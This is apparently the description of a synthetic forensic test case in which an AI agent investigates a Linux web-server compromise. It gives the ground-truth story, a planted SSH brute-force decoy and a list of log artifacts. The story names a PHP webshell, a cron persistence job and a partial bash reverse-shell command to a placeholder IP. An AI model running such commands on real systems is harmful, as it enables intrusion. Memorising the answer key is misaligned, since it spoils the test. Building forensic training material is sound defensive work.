# Synthetic Evidence Dataset — case-linux-web-04 (Linux web-server compromise)

SYNTHETIC DATA ONLY. All indicators are RFC 5737-style placeholders.

## Story (ground truth)

An attacker abused a path-traversal/upload flaw in `upload.php` on `web01` to
drop a **PHP webshell** at `/var/www/html/uploads/media.php` (T1505.003) and ran
commands through it. They spawned a **bash reverse shell** to
`203.0.113.150:4444` (`bash -i >& /dev/tcp/...` → T1059.004), escalated via a
SUID-`find` sudo misconfig, installed a **root cron job** `/usr/local/sbin/.update`
for persistence (T1053.003), and pivoted over **SSH to `db01`** with a stolen key.

## Planted decoy

An internet **SSH brute-force** from `198.51.100.66` hit root/admin just before
the alert (all `Failed password`, no `Accepted`, IP benign), and Googlebot
crawler traffic is present. The agent must self-correct from the SSH-brute-force
theory to the web-application compromise.

## Artifacts (Linux forensic analogs)

`web_access.jsonl` (access log), `linux_proc.jsonl` (auditd execve),
`bash_history.csv`, `auth_log.jsonl` (`/var/log/auth.log`), `cron.csv`
(`/etc/crontab` + spool), `filemod.csv`, `netflow.csv`, `threat_intel.csv`.
Incident window 2026-06-15 ~22:03–22:21 UTC.
